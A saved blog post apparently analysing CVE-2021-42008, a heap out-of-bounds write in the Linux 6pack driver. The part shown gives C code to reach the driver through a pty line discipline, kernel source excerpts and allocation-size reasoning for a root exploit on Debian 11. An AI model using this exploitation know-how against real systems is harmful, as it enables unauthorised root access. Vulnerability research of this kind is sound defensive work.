<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">

    <!-- Document Settings -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>[CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver</title>
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/screen.css">
    <link rel="stylesheet" type="text/css" href="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/screen_002.css">
    <link rel="stylesheet" type="text/css" href="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/syntax.css">
    <!-- highlight.js -->
    <link rel="stylesheet" href="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/default.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->

    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="CVE-2021-42008 is a Slab-Out-Of-Bounds Write vulnerability in the Linux 6pack driver caused by a missing size validation check in the decode_data function. A malicious input from a process with CAP_NET_ADMIN capability can lead to an overflow in the cooked_buf field of the sixpack structure, resulting in kernel memory corruption. This, if properly exploited, can lead to root access. In this article, after analyzing the vulnerability, we will exploit it using the techniques FizzBuzz101 and me presented in our recent articles Fire Of Salvation and Wall Of Perdition, bypassing all modern kernel protections, then, we will evaluate other approaches to perform privilege escalation.">
    <meta name="keywords" content="kernel, heap, exploit, poc, kernel exploitation, msg_msg, userfaultfd, slab-out-of-bounds, uaf, cve-2021-42008, kmalloc-4k, kmalloc-4096">
    <link rel="shortcut icon" href="https://syst3mfailure.io/favicon.ico" type="image/png">
    <link rel="canonical" href="https://syst3mfailure.io/sixpack-slab-out-of-bounds">
    <meta name="referrer" content="no-referrer-when-downgrade">

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="Syst3m Failure">
    <meta property="og:type" content="website">
    <meta property="og:title" content="[CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver">
    <meta property="og:description" content="CVE-2021-42008 is a Slab-Out-Of-Bounds Write vulnerability in the Linux 6pack driver caused by a missing size validation check in the decode_data function. A malicious input from a process with CAP_NET_ADMIN capability can lead to an overflow in the cooked_buf field of the sixpack structure, resulting in kernel memory corruption. This, if properly exploited, can lead to root access. In this article, after analyzing the vulnerability, we will exploit it using the techniques FizzBuzz101 and me presented in our recent articles Fire Of Salvation and Wall Of Perdition, bypassing all modern kernel protections, then, we will evaluate other approaches to perform privilege escalation.">
    <meta property="og:url" content="https://syst3mfailure.io/sixpack-slab-out-of-bounds">
    <meta property="og:image" content="https://syst3mfailure.io/assets/images/cve_2021_42008/title.png">
    <meta property="article:publisher" content="https://www.facebook.com/">
    <meta property="article:author" content="https://www.facebook.com/">
    <meta property="article:published_time" content="2021-12-01T01:00:00+01:00">
    <meta property="article:modified_time" content="2021-12-01T01:00:00+01:00">
    <meta property="article:tag" content="Research">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="[CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver">
    <meta name="twitter:description" content="CVE-2021-42008 is a Slab-Out-Of-Bounds Write vulnerability in the Linux 6pack driver caused by a missing size validation check in the decode_data function. A malicious input from a process with CAP_NET_ADMIN capability can lead to an overflow in the cooked_buf field of the sixpack structure, resulting in kernel memory corruption. This, if properly exploited, can lead to root access. In this article, after analyzing the vulnerability, we will exploit it using the techniques FizzBuzz101 and me presented in our recent articles Fire Of Salvation and Wall Of Perdition, bypassing all modern kernel protections, then, we will evaluate other approaches to perform privilege escalation.">
    <meta name="twitter:url" content="https://syst3mfailure.io/">
    <meta name="twitter:image" content="https://syst3mfailure.io/assets/images/cve_2021_42008/title.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Syst3m Failure">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Research">
    <meta name="twitter:site" content="@">
    <meta name="twitter:creator" content="@">
    <meta property="og:image:width" content="1400">
    <meta property="og:image:height" content="933">

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "Syst3m Failure",
        "logo": "https://syst3mfailure.io/assets/images/sflogo.png"
    },
    "url": "https://syst3mfailure.io/sixpack-slab-out-of-bounds",
    "image": {
        "@type": "ImageObject",
        "url": "https://syst3mfailure.io/assets/images/cve_2021_42008/title.png",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "https://syst3mfailure.io/sixpack-slab-out-of-bounds"
    },
    "description": "CVE-2021-42008 is a Slab-Out-Of-Bounds Write vulnerability in the Linux 6pack driver caused by a missing size validation check in the decode_data function. A malicious input from a process with CAP_NET_ADMIN capability can lead to an overflow in the cooked_buf field of the sixpack structure, resulting in kernel memory corruption. This,"
}
    </script>

    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
    <script type="text/javascript">
    ghost.init({
    	clientId: "ghost-frontend",
    	clientSecret: "f84a07a72b17"
    });
    </script> -->

    <meta name="generator" content="Jekyll 3.6.2">
    <link rel="alternate" type="application/rss+xml" title="[CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver" href="https://syst3mfailure.io/feed.xml">


<style id="fit-vids-style">.fluid-width-video-container{flex-grow: 1;width:100%;}.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
<body class="post-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="https://syst3mfailure.io/"><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/sflogo.png" alt="Syst3m Failure"></a>
            
        
        
            <ul class="nav" role="menu">
    <li class="nav-home" role="menuitem"><a href="https://syst3mfailure.io/">Home</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="https://syst3mfailure.io/tag/research/">Research</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="https://syst3mfailure.io/tag/ctf/">CTF</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="https://syst3mfailure.io/tag/various/">Various</a></li>
    <li class="nav-about" role="menuitem"><a href="https://syst3mfailure.io/about/">About</a></li>
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
            
        </div>
        
    </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full post tag-Research ">

            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime=" 1 December 2021"> 1 December 2021</time>
                    
                        <span class="date-divider">/</span>
                        
                            
                               <a href="https://syst3mfailure.io/tag/research/">RESEARCH</a>
                            
                        
                    
                </section>
                <h1 class="post-full-title">[CVE-2021-42008] Exploiting A 16-Year-Old Vulnerability In The Linux 6pack Driver</h1>
            </header>

            
            <figure class="post-full-image" style="background-image: url(/assets/images/cve_2021_42008/title.png)">
            </figure>
            

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p>CVE-2021-42008 is a Slab-Out-Of-Bounds Write 
vulnerability in the Linux 6pack driver caused by a missing size 
validation check in the decode_data function. A malicious input from a 
process with CAP_NET_ADMIN capability can lead to an overflow in the 
cooked_buf field of the sixpack structure, resulting in kernel memory 
corruption. This, if properly exploited, can lead to root access. In 
this article, after analyzing the vulnerability, we will exploit it 
using the techniques <a href="https://www.willsroot.io/">FizzBuzz101</a> and me presented in our recent articles <a href="https://www.willsroot.io/2021/08/corctf-2021-fire-of-salvation-writeup.html">Fire Of Salvation</a> and <a href="https://syst3mfailure.io/wall-of-perdition">Wall Of Perdition</a>, bypassing all modern kernel protections, then, we will evaluate other approaches to perform privilege escalation.</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/exploit.gif" alt=""></p>

<h3 id="overview">Overview</h3>

<p><a href="https://docs.kernel.org/networking/6pack.html">6pack</a> is a transmission protocol for data exchange between a PC and a <a href="https://en.wikipedia.org/wiki/Terminal_node_controller">TNC</a> (Terminal Node Controller) over a serial line. It is used as an alternative to the <a href="https://destevez.net/2016/06/kiss-hdlc-ax-25-and-friends/">KISS</a> protocol for networking over <a href="https://www.linux-ax25.org/wiki/AX.25">AX.25</a>. AX.25 is a data link layer protocol extensively used on amateur packet radio networks (and by some satellites, for example <a href="https://nanosatlab.upc.edu/en/missions-and-projects/3cat-2">3CAT2</a>).</p>

<p>The vulnerability we are going to exploit, was introduced by commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=1da177e4c3f41524e886b7f1b8a0c1fc7321cac2">1da177e4c3f41524e886b7f1b8a0c1fc7321cac2</a> with the introduction of the 6pack driver back in 2005. It was <a href="https://syzkaller.appspot.com/bug?id=1708e7a511059b09d2d4136150d3e67ff9dcf25f">found by Syzbot</a> and recently fixed by commit <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19d1532a187669ce86d5a2696eb7275310070793">19d1532a187669ce86d5a2696eb7275310070793</a>. Every kernel version before 5.13.13 that has not been patched, is affected.</p>

<p>As we mentioned in the introduction, the vulnerability is caused by a missing size validation check in the <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L832">decode_data()</a> function. A malicious input received over the sixpack channel from a process with <strong>CAP_NET_ADMIN</strong> capability, can cause the <strong>decode_data()</strong> function to be called multiple times by <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L952">sixpack_decode()</a>. The malicious input is subsequently decoded and stored into a buffer, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L98">cooked_buf</a>, inside the <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L85">sixpack</a> structure. The variable <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L101">rx_count_cooked</a> is used as index in <strong>cooked_buf</strong>, it basically determines the offset at which to write a decoded byte. The problem is that if <strong>decode_data()</strong> is called many times, the <strong>rx_count_cooked</strong> variable is incremented over and over, until it exceeds the size of <strong>cooked_buf</strong>, which can contain a maximum of <strong>400</strong> bytes. This can result in a a Slab-Out-Of-Bounds Write vulnerability, which if properly exploited, can lead to root access.</p>

<p>To exploit the vulnerability, we are going to target one of the latest Debian 11 versions. You can download it from <a href="https://cdimage.debian.org/mirror/cdimage/archive/bullseye_di_rc3/amd64/iso-cd/debian-bullseye-DI-rc3-amd64-netinst.iso">here</a>. The exploit is designed and tested for kernel <code class="highlighter-rouge">5.10.0-8-amd64</code>. All modern protections, such as <strong>KASLR</strong>, <strong>SMEP</strong>, <strong>SMAP</strong>, <strong>PTI</strong>, <strong>CONFIG_SLAB_FREELIST_RANDOM</strong>, <strong>CONFIG_SLAB_FREELIST_HARDENED</strong>, <strong>CONFIG_HARDENED_USERCOPY</strong> etc. are enabled.</p>

<h3 id="analyzing-the-vulnerable-driver">Analyzing The Vulnerable Driver</h3>

<p>In modern Linux distributions, 6pack is usually compiled as a Loadable Kernel Module.
The module can be loaded into kernel by setting the <a href="https://en.wikipedia.org/wiki/Line_discipline">line discipline</a> of a tty to <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/uapi/linux/tty.h#L19">N_6PACK</a>. To do so, we can simply create a <a href="https://linux.die.net/man/4/ptmx">ptmx</a>/<a href="https://linux.die.net/man/4/pts">pts</a> pair, respectively the master side and the slave side of a <a href="https://linux.die.net/man/7/pty">pty</a> and set the line discipline of the slave to <strong>N_6PACK</strong>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#define N_6PACK 7
</span>
<span class="kt">int</span> <span class="nf">open_ptmx</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">ptmx</span><span class="p">;</span>

    <span class="n">ptmx</span> <span class="o">=</span> <span class="n">getpt</span><span class="p">();</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ptmx</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] open_ptmx()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">grantpt</span><span class="p">(</span><span class="n">ptmx</span><span class="p">);</span>
    <span class="n">unlockpt</span><span class="p">(</span><span class="n">ptmx</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">ptmx</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">open_pts</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">pts</span><span class="p">;</span>

    <span class="n">pts</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ptsname</span><span class="p">(</span><span class="n">fd</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pts</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] open_pts()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">pts</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">set_line_discipline</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ldisc</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">TIOCSETD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldisc</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// [2]
</span>    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] ioctl() TIOCSETD"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">init_sixpack</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">ptmx</span><span class="p">,</span> <span class="n">pts</span><span class="p">;</span>

    <span class="n">ptmx</span> <span class="o">=</span> <span class="n">open_ptmx</span><span class="p">();</span>
    <span class="n">pts</span> <span class="o">=</span> <span class="n">open_pts</span><span class="p">(</span><span class="n">ptmx</span><span class="p">);</span>

    <span class="n">set_line_discipline</span><span class="p">(</span><span class="n">pts</span><span class="p">,</span> <span class="n">N_6PACK</span><span class="p">);</span> <span class="c1">// [1]
</span>
    <span class="k">return</span> <span class="n">ptmx</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>As we can see from the code above, after opening a ptmx and the respective slave side, we set the line discipline of the pts to <strong>N_6PACK</strong> <strong>[1]</strong> using the function <strong>set_line_discipline()</strong> which is nothing more than a wrapper for <code class="highlighter-rouge">ioctl(fd, TIOCSETD, &amp;ldisc)</code> <strong>[2]</strong>.</p>

<p>Line discipline, also known as LDISC, acts as an intermediate level 
between a character device and a pseudo terminal (or real hardware), 
determining the semantics associated with the device. For example, the 
line discipline is responsible for the association of a special 
character like <strong>^C</strong> entered by the user in a terminal pressing CTRL+C, to a specific signal, <strong>SIGINT</strong> in this case. To learn more about tty, pty, ptmx/pts and ldsc I recommend you to read <a href="https://www.linusakesson.net/programming/tty/index.php">The TTY demystified</a>.</p>

<p>Once we set the pts line discipline to N_6PACK, the 6pack driver is initialized by <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L768">sixpack_init_driver()</a>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">sixpack_init_driver</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">status</span><span class="p">;</span>

	<span class="n">printk</span><span class="p">(</span><span class="n">msg_banner</span><span class="p">);</span>

	<span class="cm">/* Register the provided line protocol discipline */</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">status</span> <span class="o">=</span> <span class="n">tty_register_ldisc</span><span class="p">(</span><span class="n">N_6PACK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sp_ldisc</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// [1]
</span>		<span class="n">printk</span><span class="p">(</span><span class="n">msg_regfail</span><span class="p">,</span> <span class="n">status</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">status</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>and <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/tty/tty_ldisc.c#L61">tty_register_ldisc()</a> is called by the kernel to register the new line discipline <strong>[1]</strong>. The second argument, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L750">sp_ldisc</a>, is defined as:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="k">struct</span> <span class="n">tty_ldisc_ops</span> <span class="n">sp_ldisc</span> <span class="o">=</span> <span class="p">{</span>
	<span class="p">.</span><span class="n">owner</span>		<span class="o">=</span> <span class="n">THIS_MODULE</span><span class="p">,</span>
	<span class="p">.</span><span class="n">magic</span>		<span class="o">=</span> <span class="n">TTY_LDISC_MAGIC</span><span class="p">,</span>
	<span class="p">.</span><span class="n">name</span>		<span class="o">=</span> <span class="s">"6pack"</span><span class="p">,</span>
	<span class="p">.</span><span class="n">open</span>		<span class="o">=</span> <span class="n">sixpack_open</span><span class="p">,</span>
	<span class="p">.</span><span class="n">close</span>		<span class="o">=</span> <span class="n">sixpack_close</span><span class="p">,</span>
	<span class="p">.</span><span class="n">ioctl</span>		<span class="o">=</span> <span class="n">sixpack_ioctl</span><span class="p">,</span>
	<span class="p">.</span><span class="n">receive_buf</span>	<span class="o">=</span> <span class="n">sixpack_receive_buf</span><span class="p">,</span>
	<span class="p">.</span><span class="n">write_wakeup</span>	<span class="o">=</span> <span class="n">sixpack_write_wakeup</span><span class="p">,</span>
<span class="p">};</span></code></pre></figure>

<p>Afterwards the sixpack channel is opened by <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L550">sixpack_open()</a>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span> <span class="nf">sixpack_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">rbuff</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">*</span><span class="n">xbuff</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">net_device</span> <span class="o">*</span><span class="n">dev</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sixpack</span> <span class="o">*</span><span class="n">sp</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">len</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">capable</span><span class="p">(</span><span class="n">CAP_NET_ADMIN</span><span class="p">))</span> <span class="c1">// [1]
</span>		<span class="k">return</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">tty</span><span class="o">-&gt;</span><span class="n">ops</span><span class="o">-&gt;</span><span class="n">write</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">EOPNOTSUPP</span><span class="p">;</span>

	<span class="n">dev</span> <span class="o">=</span> <span class="n">alloc_netdev</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sixpack</span><span class="p">),</span> <span class="s">"sp%d"</span><span class="p">,</span> <span class="n">NET_NAME_UNKNOWN</span><span class="p">,</span>
			   <span class="n">sp_setup</span><span class="p">);</span> <span class="c1">// [2]
</span>	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dev</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">sp</span> <span class="o">=</span> <span class="n">netdev_priv</span><span class="p">(</span><span class="n">dev</span><span class="p">);</span> <span class="c1">// [3]
</span>	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">dev</span> <span class="o">=</span> <span class="n">dev</span><span class="p">;</span>

	<span class="p">[...]</span>

	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">status</span>      <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// [4]
</span>
	<span class="p">[...]</span>

	<span class="n">timer_setup</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">tx_t</span><span class="p">,</span> <span class="n">sp_xmit_on_air</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">timer_setup</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">resync_t</span><span class="p">,</span> <span class="n">resync_tnc</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// [5]
</span>
	<span class="p">[...]</span>

	<span class="n">tty</span><span class="o">-&gt;</span><span class="n">disc_data</span> <span class="o">=</span> <span class="n">sp</span><span class="p">;</span> <span class="c1">// [6]
</span>	<span class="n">tty</span><span class="o">-&gt;</span><span class="n">receive_room</span> <span class="o">=</span> <span class="mi">65536</span><span class="p">;</span>

	<span class="cm">/* Now we're ready to register. */</span>
	<span class="n">err</span> <span class="o">=</span> <span class="n">register_netdev</span><span class="p">(</span><span class="n">dev</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>

	<span class="n">tnc_init</span><span class="p">(</span><span class="n">sp</span><span class="p">);</span> <span class="c1">// [7]
</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="p">[...]</span>
<span class="p">}</span></code></pre></figure>

<p>From the source code above, we can see that only a process with <strong>CAP_NET_ADMIN</strong> capability is allowed to interact with the 6pack driver <strong>[1]</strong>. Fortunately, this makes the vulnerability not so easily exploitable in the wild. Then, a net device is allocated using <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/netdevice.h#L4356">alloc_netdev()</a> which is a macro for <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/net/core/dev.c#L10417">alloc_netdev_mqs()</a> <strong>[2]</strong>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">[...]</span>

<span class="n">alloc_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">net_device</span><span class="p">);</span> <span class="c1">// 0x940 bytes
</span><span class="k">if</span> <span class="p">(</span><span class="n">sizeof_priv</span><span class="p">)</span> <span class="p">{</span>
	<span class="cm">/* ensure 32-byte alignment of private area */</span>
	<span class="n">alloc_size</span> <span class="o">=</span> <span class="n">ALIGN</span><span class="p">(</span><span class="n">alloc_size</span><span class="p">,</span> <span class="n">NETDEV_ALIGN</span><span class="p">);</span>
	<span class="n">alloc_size</span> <span class="o">+=</span> <span class="n">sizeof_priv</span><span class="p">;</span> <span class="c1">// 0x270 bytes
</span><span class="p">}</span>
<span class="cm">/* ensure 32-byte alignment of whole construct */</span>
<span class="n">alloc_size</span> <span class="o">+=</span> <span class="n">NETDEV_ALIGN</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">kvzalloc</span><span class="p">(</span><span class="n">alloc_size</span><span class="p">,</span> <span class="n">GFP_KERNEL</span> <span class="o">|</span> <span class="n">__GFP_RETRY_MAYFAIL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="p">)</span>
	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="n">dev</span> <span class="o">=</span> <span class="n">PTR_ALIGN</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">NETDEV_ALIGN</span><span class="p">);</span>

<span class="p">[...]</span></code></pre></figure>

<p>As we can see from <strong>alloc_netdev_mqs()</strong> source code, first it calculates the size of a <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/netdevice.h#L1858">net_device</a> structure, <strong>0x940 bytes</strong> in our case, and then it adds to it value of <strong>sizeof_priv</strong>, which corresponds to the size of a <strong>sixpack</strong> structure, <strong>0x270 bytes</strong> in our case. After alignment, this will result in an allocation of <strong>0xbcf bytes</strong>, that will end up in <strong>kmalloc-4096</strong>.</p>

<p>Back to <strong>sixpack_open()</strong>, right after the call to <strong>alloc_netdev()</strong>, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/netdevice.h#L2322">netdev_priv()</a> is called: it sets the location of the <strong>sixpack</strong> structure inside the private data region of the previously allocated net device <strong>[3]</strong>. Finally, after setting the <strong>status</strong> field of the <strong>sixpack</strong> structure to <strong>1</strong> <strong>[4]</strong> and after setting up two timers (the function called when the second time expires, <strong>resync_tnc()</strong>, will be extremely important in the exploitation phase) <strong>[5]</strong>, the tty line is linked to the sixpack channel <strong>[6]</strong>, the net device is registered, and <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L530">tnc_init()</a> is called <strong>[7]</strong>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">tnc_init</span><span class="p">(</span><span class="k">struct</span> <span class="n">sixpack</span> <span class="o">*</span><span class="n">sp</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">[...]</span>

	<span class="n">mod_timer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">resync_t</span><span class="p">,</span> <span class="n">jiffies</span> <span class="o">+</span> <span class="n">SIXP_RESYNC_TIMEOUT</span><span class="p">);</span> <span class="c1">// [1]
</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Among other things, <strong>tnc_init()</strong> sets the expiration time of the <strong>sp-&gt;resync_t</strong> timer to <code class="highlighter-rouge">jiffies + SIXP_RESYNC_TIMEOUT</code> <strong>[1]</strong>. In the Linux Kernel, <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/jiffies.h#L80">jiffies</a>
 is a global variable that stores the number of ticks occurred since the
 system boot-up. The value of this variable is incremented by one for 
each timer interrupt. In one second, there are <strong>HZ</strong> ticks (the value of <strong>HZ</strong> is determined by <a href="https://cateee.net/lkddb/web-lkddb/HZ.html">CONFIG_HZ</a>). Since we know that <code class="highlighter-rouge">HZ = number of ticks/sec</code> and <code class="highlighter-rouge">jiffies = number of ticks</code>, we can simply convert jiffies to seconds <code class="highlighter-rouge">sec = jiffies/HZ</code> and seconds to jiffies <code class="highlighter-rouge">jiffies = sec*HZ</code>.</p>

<p>This is exactly what the Linux Kernel does to determine when a timer expires. For example, a timer that expires in <strong>10 seconds</strong> from now can be represented in jiffies using <code class="highlighter-rouge">jiffies + (10*HZ)</code>.</p>

<p>In our case, the timer is set to <code class="highlighter-rouge">jiffies + SIXP_RESYNC_TIMEOUT</code>. <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/drivers/net/hamradio/6pack.c#L75">SIXP_RESYNC_TIMEOUT</a> is equal to <strong>5*HZ</strong>. So it means that once we initialize the sixpack channel, the timer will expire after <strong>5 seconds</strong> and the <strong>resync_tnc()</strong> function will be called. We will analyze this function during the exploitation phase.</p>

